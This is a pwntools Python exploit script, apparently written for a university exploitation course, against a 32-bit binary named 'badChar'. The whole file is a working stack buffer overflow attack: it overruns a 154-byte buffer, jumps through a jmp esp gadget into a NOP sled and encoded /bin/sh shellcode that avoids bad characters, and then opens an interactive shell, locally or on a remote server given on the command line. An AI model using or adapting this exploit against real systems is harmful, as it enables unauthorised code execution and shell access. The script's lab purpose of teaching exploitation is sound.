#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw)

binPath="/home/kali/ENPM691/Lecture8/badChar"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *copyData+29
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.update(arch='i386', os='linux')

io = start()

# define Payload & Gadgets
bufLen = 154
numNOPs = 20
jmpESP = pwn.p32(0x80491a7)

# generate /bin/sh shellcode
shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh(), arch="i386")
pwn.info("Shellcode length: %d",len(shellcode))

# encode our payload
avoid= b"\x00\x0b\x0a\x09\x0c\x0d\x20"
en_shellcode = pwn.pwnlib.encoders.encoder.encode(shellcode, avoid)

pwn.info("Encoded Shellcode Length: %d",len(en_shellcode))

# NOPs
NOP = numNOPs*b'\x90'
overFlow = bufLen * b'A'

buffer = pwn.flat(
        [
            overFlow,
            jmpESP,
            NOP,
            en_shellcode,
            b'B'*8
        ])

pwn.info("buffer len: %d",len(buffer))
io.sendline(buffer)

io.interactive()
